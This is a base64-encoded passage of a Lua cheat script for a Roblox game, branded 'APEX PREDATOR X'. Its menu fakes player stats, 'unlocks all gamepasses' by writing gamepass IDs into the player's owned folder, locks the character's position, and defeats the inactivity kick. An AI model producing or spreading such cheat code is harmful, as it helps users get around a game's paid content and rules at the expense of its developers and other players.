dGF0cyBpbiB0aGUgZ2FtZQpsb2NhbCBmdW5jdGlvbiB1cGRhdGVHYW1lU3RhdHMoKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAKICAgIC0tIFVwZGF0ZSBsZWFkZXJzdGF0cwogICAgbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgIGlmIGxlYWRlcnN0YXRzIHRoZW4KICAgICAgICAtLSBTdHJlbmd0aAogICAgICAgIGxvY2FsIHN0cmVuZ3RoID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikKICAgICAgICBpZiBzdHJlbmd0aCBhbmQgdG9nZ2xlU3RhdGVzLlN0cmVuZ3RoIHRoZW4KICAgICAgICAgICAgc3RyZW5ndGguVmFsdWUgPSBmYWtlU3RhdHMuU3RyZW5ndGgKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBSZWJpcnRocwogICAgICAgIGxvY2FsIHJlYmlydGhzID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikKICAgICAgICBpZiByZWJpcnRocyBhbmQgdG9nZ2xlU3RhdGVzLlJlYmlydGhzIHRoZW4KICAgICAgICAgICAgcmViaXJ0aHMuVmFsdWUgPSBmYWtlU3RhdHMuUmViaXJ0aHMKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBLaWxscwogICAgICAgIGxvY2FsIGtpbGxzID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIktpbGxzIikKICAgICAgICBpZiBraWxscyBhbmQgdG9nZ2xlU3RhdGVzLktpbGxzIHRoZW4KICAgICAgICAgICAga2lsbHMuVmFsdWUgPSBmYWtlU3RhdHMuS2lsbHMKICAgICAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLktpbGxzIHRoZW4KICAgICAgICAgICAga2lsbHMgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICAgICAga2lsbHMuTmFtZSA9ICJLaWxscyIKICAgICAgICAgICAga2lsbHMuVmFsdWUgPSBmYWtlU3RhdHMuS2lsbHMKICAgICAgICAgICAga2lsbHMuUGFyZW50ID0gbGVhZGVyc3RhdHMKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBCcmF3bHMKICAgICAgICBsb2NhbCBicmF3bHMgPSBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiQnJhd2xzIikKICAgICAgICBpZiBicmF3bHMgYW5kIHRvZ2dsZVN0YXRlcy5CcmF3bHMgdGhlbgogICAgICAgICAgICBicmF3bHMuVmFsdWUgPSBmYWtlU3RhdHMuQnJhd2xzCiAgICAgICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5CcmF3bHMgdGhlbgogICAgICAgICAgICBicmF3bHMgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICAgICAgYnJhd2xzLk5hbWUgPSAiQnJhd2xzIgogICAgICAgICAgICBicmF3bHMuVmFsdWUgPSBmYWtlU3RhdHMuQnJhd2xzCiAgICAgICAgICAgIGJyYXdscy5QYXJlbnQgPSBsZWFkZXJzdGF0cwogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBEdXJhYmlsaXR5CiAgICBsb2NhbCBkdXJhYmlsaXR5ID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJEdXJhYmlsaXR5IikKICAgIGlmIGR1cmFiaWxpdHkgYW5kIHRvZ2dsZVN0YXRlcy5EdXJhYmlsaXR5IHRoZW4KICAgICAgICBkdXJhYmlsaXR5LlZhbHVlID0gZmFrZVN0YXRzLkR1cmFiaWxpdHkKICAgIGVuZAogICAgCiAgICAtLSBVcGRhdGUgR2VtcyAodW5kZXIgcGxheWVyKQogICAgbG9jYWwgZ2VtcyA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiR2VtcyIpCiAgICBpZiBnZW1zIGFuZCB0b2dnbGVTdGF0ZXMuR2VtcyB0aGVuCiAgICAgICAgZ2Vtcy5WYWx1ZSA9IGZha2VTdGF0cy5HZW1zCiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkdlbXMgdGhlbgogICAgICAgIGdlbXMgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICBnZW1zLk5hbWUgPSAiR2VtcyIKICAgICAgICBnZW1zLlZhbHVlID0gZmFrZVN0YXRzLkdlbXMKICAgICAgICBnZW1zLlBhcmVudCA9IHBsYXllcgogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBBZ2lsaXR5CiAgICBsb2NhbCBhZ2lsaXR5ID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJBZ2lsaXR5IikKICAgIGlmIGFnaWxpdHkgYW5kIHRvZ2dsZVN0YXRlcy5BZ2lsaXR5IHRoZW4KICAgICAgICBhZ2lsaXR5LlZhbHVlID0gZmFrZVN0YXRzLkFnaWxpdHkKICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuQWdpbGl0eSB0aGVuCiAgICAgICAgYWdpbGl0eSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgIGFnaWxpdHkuTmFtZSA9ICJBZ2lsaXR5IgogICAgICAgIGFnaWxpdHkuVmFsdWUgPSBmYWtlU3RhdHMuQWdpbGl0eQogICAgICAgIGFnaWxpdHkuUGFyZW50ID0gcGxheWVyCiAgICBlbmQKICAgIAogICAgLS0gVXBkYXRlIEthcm1hCiAgICBsb2NhbCBnb29kS2FybWEgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImdvb2RLYXJtYSIpCiAgICBpZiBnb29kS2FybWEgYW5kIHRvZ2dsZVN0YXRlcy5Hb29kS2FybWEgdGhlbgogICAgICAgIGdvb2RLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5Hb29kS2FybWEKICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuR29vZEthcm1hIHRoZW4KICAgICAgICBnb29kS2FybWEgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICBnb29kS2FybWEuTmFtZSA9ICJnb29kS2FybWEiCiAgICAgICAgZ29vZEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkdvb2RLYXJtYQogICAgICAgIGdvb2RLYXJtYS5QYXJlbnQgPSBwbGF5ZXIKICAgIGVuZAogICAgCiAgICBsb2NhbCBldmlsS2FybWEgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImV2aWxLYXJtYSIpCiAgICBpZiBldmlsS2FybWEgYW5kIHRvZ2dsZVN0YXRlcy5FdmlsS2FybWEgdGhlbgogICAgICAgIGV2aWxLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5FdmlsS2FybWEKICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuRXZpbEthcm1hIHRoZW4KICAgICAgICBldmlsS2FybWEgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICBldmlsS2FybWEuTmFtZSA9ICJldmlsS2FybWEiCiAgICAgICAgZXZpbEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkV2aWxLYXJtYQogICAgICAgIGV2aWxLYXJtYS5QYXJlbnQgPSBwbGF5ZXIKICAgIGVuZAplbmQKCi0tIEluc3RydWN0aW9ucyBTZWN0aW9uCkZha2VTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJJbnN0cnVjdGlvbnMifSkKRmFrZVN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9ICLwn5OdIEhvdyB0byBVc2UiLCBEZXNjID0gIlRvZ2dsZSBPTiBmb3IgZWFjaCBzdGF0IHRvIGVuYWJsZSBmYWtlIHN0YXQifSkKRmFrZVN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9ICLwn5KhIEZvcm1hdCIsIERlc2MgPSAiMTAwMCBvciAxSyBvciAxLjVNIG9yIDIuM0IgKE1heDogMTAwMDBRYSkifSkKCi0tIEhlbHBlciBmdW5jdGlvbiB0byBjcmVhdGUgc3RhdCBjb250cm9scwpsb2NhbCBmdW5jdGlvbiBjcmVhdGVTdGF0Q29udHJvbChzdGF0TmFtZSwgZGlzcGxheU5hbWUsIGRlc2NyaXB0aW9uKQogICAgRmFrZVN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gZGlzcGxheU5hbWV9KQogICAgCiAgICBsb2NhbCBpbnB1dCA9IEZha2VTdGF0c1RhYjpUZXh0Ym94KHsKICAgICAgICBUaXRsZSA9IGRpc3BsYXlOYW1lIC4uICIgVmFsdWUiLAogICAgICAgIERlc2MgPSBkZXNjcmlwdGlvbiwKICAgICAgICBQbGFjZWhvbGRlciA9ICJlLmcuLCAxMDAwIG9yIDFLIG9yIDEuNU0iLAogICAgICAgIFZhbHVlID0gIiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IHBhcnNlTnVtYmVyKHRleHQpCiAgICAgICAgICAgIGZha2VTdGF0c1tzdGF0TmFtZV0gPSB2YWx1ZQogICAgICAgICAgICBpZiB0b2dnbGVTdGF0ZXNbc3RhdE5hbWVdIHRoZW4KICAgICAgICAgICAgICAgIHVwZGF0ZUdhbWVTdGF0cygpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgRmFrZVN0YXRzVGFiOlRvZ2dsZSh7CiAgICAgICAgVGl0bGUgPSBkaXNwbGF5TmFtZSAuLiAiIFRvZ2dsZSIsCiAgICAgICAgRGVzYyA9ICJFbmFibGUgZmFrZSAiIC4uIGRpc3BsYXlOYW1lOmxvd2VyKCksCiAgICAgICAgVmFsdWUgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICB0b2dnbGVTdGF0ZXNbc3RhdE5hbWVdID0gc3RhdGUKICAgICAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICAgICAgdXBkYXRlR2FtZVN0YXRzKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQKCi0tIENyZWF0ZSBhbGwgc3RhdCBjb250cm9scwpjcmVhdGVTdGF0Q29udHJvbCgiU3RyZW5ndGgiLCAiU3RyZW5ndGgiLCAiRmFrZSBzdHJlbmd0aCBzdGF0IikKY3JlYXRlU3RhdENvbnRyb2woIkR1cmFiaWxpdHkiLCAiRHVyYWJpbGl0eSIsICJGYWtlIGR1cmFiaWxpdHkgc3RhdCIpIApjcmVhdGVTdGF0Q29udHJvbCgiUmViaXJ0aHMiLCAiUmViaXJ0aHMiLCAiRmFrZSByZWJpcnRocyBjb3VudCIpCmNyZWF0ZVN0YXRDb250cm9sKCJHZW1zIiwgIkdlbXMiLCAiRmFrZSBnZW1zIGFtb3VudCIpCmNyZWF0ZVN0YXRDb250cm9sKCJLaWxscyIsICJLaWxscyIsICJGYWtlIGtpbGxzIGNvdW50IikKY3JlYXRlU3RhdENvbnRyb2woIkJyYXdscyIsICJCcmF3bHMiLCAiRmFrZSBicmF3bHMgY291bnQiKQpjcmVhdGVTdGF0Q29udHJvbCgiQWdpbGl0eSIsICJBZ2lsaXR5IiwgIkZha2UgYWdpbGl0eSBzdGF0IikKY3JlYXRlU3RhdENvbnRyb2woIkdvb2RLYXJtYSIsICJHb29kIEthcm1hIiwgIkZha2UgZ29vZCBrYXJtYSIpCmNyZWF0ZVN0YXRDb250cm9sKCJFdmlsS2FybWEiLCAiRXZpbCBLYXJtYSIsICJGYWtlIGV2aWwga2FybWEiKQoKLS0gUXVpY2sgU2V0IFNlY3Rpb24KRmFrZVN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlF1aWNrIFNldCJ9KQoKRmFrZVN0YXRzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJTZXQgQWxsIHRvIDFRYSIsCiAgICBEZXNjID0gIlF1aWNrbHkgc2V0IGFsbCBzdGF0cyB0byAxIFF1YWRyaWxsaW9uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBzdGF0TmFtZSBpbiBwYWlycyhmYWtlU3RhdHMpIGRvCiAgICAgICAgICAgIGZha2VTdGF0c1tzdGF0TmFtZV0gPSAxMDAwMDAwMDAwMDAwMDAwCiAgICAgICAgICAgIHRvZ2dsZVN0YXRlc1tzdGF0TmFtZV0gPSB0cnVlCiAgICAgICAgZW5kCiAgICAgICAgdXBkYXRlR2FtZVN0YXRzKCkKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiUXVpY2sgU2V0IiwKICAgICAgICAgICAgRGVzYyA9ICJBbGwgc3RhdHMgc2V0IHRvIDFRYSBhbmQgZW5hYmxlZCEiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKCkZha2VTdGF0c1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiRGlzYWJsZSBBbGwgU3RhdHMiLAogICAgRGVzYyA9ICJUdXJuIG9mZiBhbGwgZmFrZSBzdGF0cyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBmb3Igc3RhdE5hbWUgaW4gcGFpcnModG9nZ2xlU3RhdGVzKSBkbwogICAgICAgICAgICB0b2dnbGVTdGF0ZXNbc3RhdE5hbWVdID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiRmFrZSBTdGF0cyIsCiAgICAgICAgICAgIERlc2MgPSAiQWxsIGZha2Ugc3RhdHMgZGlzYWJsZWQhIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgotLSBNaXNjIFRhYgpsb2NhbCBNaXNjVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiTWlzYyIsIEljb24gPSAic2V0dGluZ3MifSkKCi0tIFV0aWxpdHkgU2VjdGlvbgpNaXNjVGFiOlNlY3Rpb24oe1RpdGxlID0gIlV0aWxpdHkifSkKCk1pc2NUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkdhbWVwYXNzIEF1dG9MaWZ0IiwKICAgIERlc2MgPSAiVW5sb2NrIGFsbCBnYW1lcGFzc2VzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGdhbWVwYXNzRm9sZGVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLmdhbWVwYXNzSWRzCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgICAgICBmb3IgXywgZ2FtZXBhc3MgaW4gcGFpcnMoZ2FtZXBhc3NGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgbG9jYWwgdmFsdWUgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICAgICAgdmFsdWUuTmFtZSA9IGdhbWVwYXNzLk5hbWUKICAgICAgICAgICAgdmFsdWUuVmFsdWUgPSBnYW1lcGFzcy5WYWx1ZQogICAgICAgICAgICB2YWx1ZS5QYXJlbnQgPSBwbGF5ZXIub3duZWRHYW1lcGFzc2VzCiAgICAgICAgZW5kCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIkdhbWVwYXNzIEF1dG9MaWZ0IiwKICAgICAgICAgICAgRGVzYyA9ICJBbGwgZ2FtZXBhc3NlcyB1bmxvY2tlZCEiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKCi0tIFBlcmZvcm1hbmNlIFNlY3Rpb24KTWlzY1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJQZXJmb3JtYW5jZSJ9KQoKTWlzY1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiSGlkZSBGcmFtZXMiLAogICAgRGVzYyA9ICJWZXJ5IE9wIiwKICAgIFZhbHVlID0gZmFsc2UsIC0tIERlZmF1bHQgT0ZGCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIG9iai5OYW1lOm1hdGNoKCJGcmFtZSQiKSB0aGVuCiAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IG5vdCBzdGF0ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQ2hhcmFjdGVyIFNlY3Rpb24KTWlzY1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJDaGFyYWN0ZXIifSkKCk1pc2NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIlBvc2l0aW9uIExvY2siLAogICAgRGVzYyA9ICJMb2NrIHlvdXIgY2hhcmFjdGVyIGluIHBsYWNlIiwKICAgIFZhbHVlID0gZmFsc2UsIC0tIERlZmF1bHQgT0ZGCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgbG9jYWwgY3VycmVudFBvcyA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgZ2V0Z2VudigpLnBvc0xvY2sgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBjdXJyZW50UG9zCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIlBvc2l0aW9uIExvY2siLAogICAgICAgICAgICAgICAgRGVzYyA9ICJQb3NpdGlvbiBsb2NrZWQgaW4gcGxhY2UhIiwKICAgICAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiBnZXRnZW52KCkucG9zTG9jayB0aGVuCiAgICAgICAgICAgICAgICBnZXRnZW52KCkucG9zTG9jazpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIGdldGdlbnYoKS5wb3NMb2NrID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIlBvc2l0aW9uIExvY2siLAogICAgICAgICAgICAgICAgRGVzYyA9ICJQb3NpdGlvbiBsb2NrIGRpc2FibGVkISIsCiAgICAgICAgICAgICAgICBUaW1lID0gMwogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBbnRpIEFGSyBTZWN0aW9uCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiQW50aSBBRksifSkKCgpNaXNjVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBbnRpIEFGSyIsCiAgICBEZXNjID0gIlByZXZlbnQgYmVpbmcga2lja2VkIGZvciBpbmFjdGl2aXR5IiwKICAgIFZhbHVlID0gdHJ1ZSwgLS0gRGVmYXVsdCBPRkYKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICAtLSBDcmVhdGUgRmFkaW5nIERpc3BsYXkKICAgICAgICAgICAgbG9jYWwgRGlzcGxheUd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgICAgICAgICAgbG9jYWwgRGlzcGxheUxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICBsb2NhbCBUaW1lckxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICAKICAgICAgICAgICAgRGlzcGxheUd1aS5OYW1lID0gIkFudGlBRktEaXNwbGF5IgogICAgICAgICAgICBEaXNwbGF5R3VpLlBhcmVudCA9IGdhbWUuQ29yZUd1aQogICAgICAgICAgICBEaXNwbGF5R3VpLlpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nCiAgICAgICAgICAgIAogICAgICAgICAgICBEaXNwbGF5TGFiZWwuTmFtZSA9ICJEaXNwbGF5TGFiZWwiCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5QYXJlbnQgPSBEaXNwbGF5R3VpCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC40LCAwLCAwLjAxLCAwKQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjIsIDAsIDAsIDMwKQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1CbGFjawogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dCA9ICJBUEVYIFBSRURBVE9SIFggLSBBTlRJIEFGSyIKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRTaXplID0gMTgKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuQ2VudGVyCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBHcmFkaWVudCBmb3IgRGlzcGxheUxhYmVsCiAgICAgICAgICAgIGxvY2FsIGRpc3BsYXlHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpCiAgICAgICAgICAgIGRpc3BsYXlHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsKICAgICAgICAgICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMjgsIDIxNiwgMjEwKSksICAgLS0gIzFDRDhEMgogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigxNDcsIDIzNywgMTk5KSkgICAtLSAjOTNFREM3CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGRpc3BsYXlHcmFkaWVudC5Sb3RhdGlvbiA9IDAKICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LlBhcmVudCA9IERpc3BsYXlMYWJlbAogICAgICAgICAgICAKICAgICAgICAgICAgVGltZXJMYWJlbC5OYW1lID0gIlRpbWVyTGFiZWwiCiAgICAgICAgICAgIFRpbWVyTGFiZWwuUGFyZW50ID0gRGlzcGxheUd1aQogICAgICAgICAgICBUaW1lckxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIFRpbWVyTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC40LCAwLCAwLjA0NSwgMCkKICAgICAgICAgICAgVGltZXJMYWJlbC5TaXplID0gVURpbTIubmV3KDAuMiwgMCwgMCwgMzApCiAgICAgICAgICAgIFRpbWVyTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dCA9ICIwMDowMDowMCIKICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0U2l6ZSA9IDEyCiAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuQ2VudGVyCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBHcmFkaWVudCBmb3IgVGltZXJMYWJlbAogICAgICAgICAgICBsb2NhbCB0aW1lckdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKICAgICAgICAgICAgdGltZXJHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsKICAgICAgICAgICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMjgsIDIxNiwgMjEwKSksICAgLS0gIzFDRDhEMgogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigxNDcsIDIzNywgMTk5KSkgICAtLSAjOTNFREM3CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHRpbWVyR3JhZGllbnQuUm90YXRpb24gPSAwCiAgICAgICAgICAgIHRpbWVyR3JhZGllbnQuUGFyZW50ID0gVGltZXJMYWJlbAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gQW5pbWF0ZSBncmFkaWVudHMKICAgICAgICAgICAgX0cuYW5pbWF0ZUdyYWRpZW50cyA9IHRydWUKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBfRy5hbmltYXRlR3JhZGllbnRzIGRvCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAwLCAzNjAsIDIgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmFuaW1hdGVHcmFkaWVudHMgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lckdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBBbmltYXRpb24gbG9vcCBmb3IgZmFkaW5nCiAgICAgICAgICAgIF9HLmRpc3BsYXlBRksgPSB0cnVlCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgX0cuZGlzcGxheUFGSyBkbwogICAgICAgICAgICAgICAgICAgIC0tIEZhZGUgb3V0IGJvdGgKICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDAsIDEsIDAuMSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gRmFkZSBpbiBib3RoCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAxLCAwLCAtMC4xIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICAgICAgICAgICAgICBUaW1lckxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gVGltZXIKICAgICAgICAgICAgbG9jYWwgc2Vjb25kcywgbWludXRlcywgaG91cnMgPSAwLCAwLCAwCiAgICAgICAgICAgIF9HLnRpbWVyQUZLID0gdHJ1ZQogICAgICAgICAgICB0